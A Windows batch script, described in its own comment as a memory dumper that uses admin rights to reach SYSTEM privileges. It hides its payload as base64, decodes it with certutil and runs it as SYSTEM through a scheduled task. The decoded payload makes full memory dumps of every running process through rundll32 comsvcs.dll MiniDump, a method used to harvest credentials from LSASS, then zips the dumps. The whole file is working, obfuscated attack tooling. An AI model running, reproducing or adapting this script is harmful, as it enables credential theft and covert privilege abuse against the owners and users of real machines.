@echo off
rem Procdump: dumps memory of all running processes. REQUIRES ADMINISTRATOR RIGHTS TO LEVERAGE TO SYSTEM PRIVILEGES.
set folder=%~dp0

echo y | del %folder%\t.bat.b64
echo y | del %folder%\t.bat

echo QGVjaG8gb2ZmDQoNCnNldCBmb2xkZXI9JX5kcDANCnBvd2Vyc2hlbGwgLWMgIkdldC1XbWlPYmplY3QgV2luMzJfUHJvY2VzcyB8IFNlbGVjdC1PYmplY3QgUHJvY2Vzc0lEIiA+ICVmb2xkZXIlXHBpZC50eHQNCg0KZWNobyBQcm9jZXNzQ291bnQ6DQpwb3dlcnNoZWxsIC1jICJHZXQtQ29udGVudCAlZm9sZGVyJVxwaWQudHh0IHwgTWVhc3VyZS1PYmplY3QgLUxpbmUiIHwgZmluZCAvdiAvaSAiTGluZXMiIHwgZmluZCAvdiAvaSAiLS0tLSIgPiAlZm9sZGVyJVxwaWQuY291bnQudHh0DQp0eXBlICVmb2xkZXIlXHBpZC5jb3VudC50eHQNCg0KZm9yIC9mICUleCBJTiAoJWZvbGRlciVccGlkLnR4dCkgZG8gKA0KCWVjaG8gRHVtcGluZyBQSUQ6ICUleA0KCXJ1bmRsbDMyIGM6XFdpbmRvd3NcU3lzdGVtMzJcY29tc3Zjcy5kbGwgTWluaUR1bXAgJSV4ICVmb2xkZXIlXHBpZC4lJXguZG1wIGZ1bGwNCikNCg0KZm9yIC9mICUlZiBpbiAoJ2RpciAvYiAlZm9sZGVyJVxwaWQuKi5kbXAnKSBkbyAoDQoJaWYgZXhpc3QgIiVmb2xkZXIlXCUlZiIgKCAgICANCgkJZWNobyAtLSBDb21wcmVzc2luZyAlZm9sZGVyJVwlJWYuemlwDQoJCXBvd2Vyc2hlbGwgLWMgIkNvbXByZXNzLUFyY2hpdmUgLVBhdGggJWZvbGRlciVcJSVmIC1EZXN0aW5hdGlvblBhdGggJWZvbGRlciVcJSVmLnppcCINCgkJZWNobyB5IHwgZGVsICVmb2xkZXIlXCUlZg0KCSkNCikNCg0K >%folder%\t.bat.b64

certutil -decode %folder%\t.bat.b64 %folder%\t.bat

SCHTASKS /Delete /TN MEMDUMP /F > nul
SCHTASKS /Create /RU "SYSTEM" /SC Once /TN MEMDUMP /ST 23:59 /TR %folder%\t.bat
SCHTASKS /Run /TN MEMDUMP

